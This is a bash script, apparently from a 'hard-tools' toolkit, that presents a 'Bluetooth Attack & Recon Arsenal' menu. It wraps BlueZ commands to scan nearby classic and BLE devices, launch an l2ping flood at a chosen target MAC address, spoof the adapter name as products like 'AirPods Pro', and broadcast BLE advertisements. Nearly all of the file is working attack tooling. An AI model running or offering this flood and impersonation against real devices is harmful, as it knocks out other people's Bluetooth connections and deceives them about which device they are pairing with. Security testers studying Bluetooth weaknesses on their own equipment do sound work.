#!/usr/bin/env bash
#
# hard-tools: scripts/bt_arsenal.sh
# Bluetooth Reconnaissance, Stress-Testing (L2ping), and BLE Beacon Emulator
#

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB_DIR="$(cd "${SCRIPT_DIR}/../lib" && pwd)"
source "${LIB_DIR}/utils.sh"

HCI_DEV="hci0"

check_bt_interface() {
    if ! hciconfig "$HCI_DEV" >/dev/null 2>&1; then
        # Check any hci device
        local dev
        dev=$(hciconfig 2>/dev/null | grep -o "hci[0-9]" | head -n1 || true)
        if [[ -n "$dev" ]]; then
            HCI_DEV="$dev"
        else
            log_warn "No Bluetooth HCI controller detected (check if Bluetooth is enabled on device)."
            return 1
        fi
    fi
    return 0
}

bt_up() {
    print_header "Bringing UP Bluetooth Interface ($HCI_DEV)"
    sudo hciconfig "$HCI_DEV" up 2>/dev/null || true
    sudo hciconfig "$HCI_DEV" piscan 2>/dev/null || true
    log_success "Interface $HCI_DEV is UP and discoverable."
}

bt_scan() {
    print_header "Classic Bluetooth Device Scan (Inquiry)"
    check_bt_interface || return 1
    log_info "Scanning for nearby Bluetooth devices (10s)..."
    sudo hcitool scan 2>&1
    echo
}

ble_scan() {
    print_header "Bluetooth Low Energy (BLE) Scan"
    check_bt_interface || return 1
    log_info "Scanning for BLE advertisements (Press Ctrl+C to stop)..."
    sudo timeout 15 hcitool lescan 2>&1 || true
    echo
}

l2ping_flood() {
    print_header "L2CAP Ping Flood / Stress Test"
    check_bt_interface || return 1
    read -rp "Enter Target Bluetooth MAC Address (XX:XX:XX:XX:XX:XX): " target_mac
    [[ -z "$target_mac" ]] && return 1

    read -rp "Packet size in bytes [600]: " psize
    psize="${psize:-600}"

    read -rp "Flood mode (-f continuous rapid ping)? [Y/n]: " is_flood
    local flood_flag="-f"
    if [[ "$is_flood" =~ ^[Nn]$ ]]; then
        flood_flag=""
    fi

    log_info "Launching L2ping to $target_mac with ${psize}B payload... (Press Ctrl+C to stop)"
    sudo l2ping -i "$HCI_DEV" -s "$psize" $flood_flag "$target_mac"
}

bt_spoof_name() {
    print_header "Spoof Bluetooth Device Name"
    check_bt_interface || return 1
    read -rp "Enter new device name (e.g. 'AirPods Pro' or 'Bose QC35'): " new_name
    [[ -z "$new_name" ]] && return 1
    sudo hciconfig "$HCI_DEV" name "$new_name"
    log_success "Device name changed to '$new_name'."
}

ble_beacon_spam() {
    print_header "BLE Beacon / Advertisement Emulator"
    check_bt_interface || return 1
    log_info "Starting BLE Advertising on $HCI_DEV..."
    sudo hciconfig "$HCI_DEV" leadv 3 2>/dev/null || true
    log_success "BLE Advertising active."
}

status() {
    print_header "Bluetooth Arsenal Status"
    local hci_info
    hci_info=$(hciconfig 2>/dev/null || echo "No HCI adapter active")
    echo "$hci_info"
    echo
}

menu() {
    while true; do
        print_header "Bluetooth Attack & Recon Arsenal"
        status
        echo " 1) Enable / Bring UP Bluetooth (piscan)"
        echo " 2) Scan for Classic Bluetooth Devices (hcitool scan)"
        echo " 3) Scan for BLE Devices (lescan)"
        echo " 4) L2CAP Ping Stress Test / Flood (l2ping)"
        echo " 5) Spoof Bluetooth Device Name"
        echo " 6) Start BLE Advertisement Beacon"
        echo " 7) Stop / Reset Bluetooth Interface"
        echo " 0) Back to Main Menu"
        echo
        read -rp "Choice: " choice
        case "$choice" in
            1) bt_up; press_enter ;;
            2) bt_scan; press_enter ;;
            3) ble_scan; press_enter ;;
            4) l2ping_flood; press_enter ;;
            5) bt_spoof_name; press_enter ;;
            6) ble_beacon_spam; press_enter ;;
            7) sudo hciconfig "$HCI_DEV" reset 2>/dev/null || true; log_success "Reset $HCI_DEV."; press_enter ;;
            0) break ;;
            *) c_red "Invalid option."; sleep 1 ;;
        esac
    done
}

case "${1:-}" in
    scan)    bt_scan ;;
    lescan)  ble_scan ;;
    flood)   l2ping_flood ;;
    status)  status ;;
    menu|"") menu ;;
    *) echo "Usage: $0 {scan|lescan|flood|status|menu}" ;;
esac
